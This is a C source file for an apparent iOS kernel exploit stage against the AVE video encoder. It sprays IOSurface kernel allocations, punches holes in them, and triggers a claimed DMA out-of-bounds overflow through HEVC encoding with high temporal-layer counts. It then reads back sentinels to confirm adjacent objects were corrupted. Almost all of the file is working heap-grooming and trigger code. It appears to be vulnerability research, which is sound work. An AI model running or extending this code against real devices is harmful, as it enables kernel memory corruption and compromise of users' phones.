/*
 * ave_heap_spray.c — AVE DMA OOB Heap Spray & Target Positioning
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Position kernel objects adjacent to AVE DMA output buffers
 * so that NTL 9-63 silent overflow corrupts them predictably.
 *
 * Strategy:
 * 1. Spray IOSurface properties to create many kernel allocations
 * 2. Free some to create holes for AVE DMA buffer
 * 3. Encode with NTL in silent overflow range
 * 4. DMA OOB corrupts adjacent IOSurface properties
 * 5. Read back properties to detect corruption
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface -framework IOKit \
 *     -o ave_heap_spray ave_heap_spray.c -Wno-deprecated-declarations
 *
 * Deployed as: AVESpray.app (com.research.avespray)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

#define SPRAY_COUNT 256
#define HOLE_STRIDE 4

static IOSurfaceRef g_surfaces[SPRAY_COUNT];

static IOSurfaceRef create_spray_surface(int idx) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w=64, h=64, bpr=256, alloc=64*256, fmt=0x42475241;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
    CFNumberRef nfmt = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
    CFRelease(nfmt); CFRelease(props);

    if (surf) {
        uint32_t sentinel = 0xDEAD0000 | (idx & 0xFFFF);
        CFNumberRef nsen = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sentinel);
        IOSurfaceSetValue(surf, CFSTR("ResearchSentinel"), nsen);
        CFRelease(nsen);

        uint8_t pad[256]; memset(pad, 0x42 + (idx & 0xFF), sizeof(pad));
        CFDataRef padData = CFDataCreate(kCFAllocatorDefault, pad, sizeof(pad));
        IOSurfaceSetValue(surf, CFSTR("ResearchPad"), padData);
        CFRelease(padData);
    }
    return surf;
}

static int check_sentinel(IOSurfaceRef surf, int idx) {
    CFNumberRef val = (CFNumberRef)IOSurfaceCopyValue(surf, CFSTR("ResearchSentinel"));
    if (!val) return -1;
    uint32_t sentinel = 0;
    CFNumberGetValue(val, kCFNumberIntType, &sentinel);
    CFRelease(val);
    uint32_t expected = 0xDEAD0000 | (idx & 0xFFFF);
    if (sentinel != expected) {
        p("  !! CORRUPTION surf[%d]: expected 0x%08x got 0x%08x\n", idx, expected, sentinel);
        return 1;
    }
    return 0;
}

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    (*(int *)ref)++;
}

static int do_encode(int ntl, int frames) {
    p("  Encoding: NTL=%d frames=%d\n", ntl, frames);
    CFMutableDictionaryRef srcAttrs = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef ioSurfProps = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferIOSurfacePropertiesKey, ioSurfProps);
    CFRelease(ioSurfProps);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fmtNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferPixelFormatTypeKey, fmtNum);
    CFRelease(fmtNum);

    int cb_count = 0;
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, srcAttrs, NULL, encode_cb, &cb_count, &session);
    CFRelease(srcAttrs);
    if (st != noErr || !session) return -1;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    CFNumberRef n;
    int usage = 1;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &usage);
    VTSessionSetProperty(session, CFSTR("EncoderUsage"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
    VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) { VTCompressionSessionInvalidate(session); CFRelease(session); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(session);
    if (!pool) { VTCompressionSessionInvalidate(session); CFRelease(session); return -2; }

    for (int f = 0; f < frames; f++) {
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) continue;
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, f & 0xFF, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(f,30), CMTimeMake(1,30), NULL, NULL, NULL);
        CVPixelBufferRelease(pb);
        if (st != noErr) break;
    }
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    p("  Callbacks: %d\n", cb_count);
    VTCompressionSessionInvalidate(session); CFRelease(session);
    return cb_count;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_heapspray_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Heap Spray Probe ===\nMode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n\n", buf);

    if (strcmp(mode, "spray_only") == 0) {
        p("Phase 1: Spraying %d IOSurfaces...\n", SPRAY_COUNT);
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_spray_surface(i);
        for (int i = 0; i < SPRAY_COUNT && g_surfaces[i]; i += 16)
            p("  surf[%d] id=%u alloc=%zu\n", i, IOSurfaceGetID(g_surfaces[i]), IOSurfaceGetAllocSize(g_surfaces[i]));
        int ok=0, bad=0;
        for (int i = 0; i < SPRAY_COUNT && g_surfaces[i]; i++) { if (check_sentinel(g_surfaces[i],i)==0) ok++; else bad++; }
        p("  Sentinel: %d ok, %d corrupted\n", ok, bad);
        for (int i = 0; i < SPRAY_COUNT && g_surfaces[i]; i++) CFRelease(g_surfaces[i]);
    } else if (strncmp(mode, "spray_ntl", 9) == 0) {
        int ntl = atoi(mode + 9);
        if (ntl < 2) ntl = 9;
        p("Phase 1: Spray %d IOSurfaces\n", SPRAY_COUNT);
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_spray_surface(i);
        p("Phase 2: Free every %dth (create holes)\n", HOLE_STRIDE);
        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE) { if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i]=NULL; } }
        p("Phase 3: Encode NTL=%d\n", ntl);
        do_encode(ntl, 5);
        usleep(100000);
        p("Phase 4: Check corruption\n");
        int ok=0, bad=0, miss=0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) { miss++; continue; }
            if (check_sentinel(g_surfaces[i],i)==0) ok++; else bad++;
        }
        p("  Results: %d ok, %d CORRUPTED, %d freed\n", ok, bad, miss);
        if (bad > 0) p("\n*** CORRUPTION DETECTED ***\n");
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);
    } else { p("Modes: spray_only spray_ntl9 spray_ntl32 spray_ntl48\n"); }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
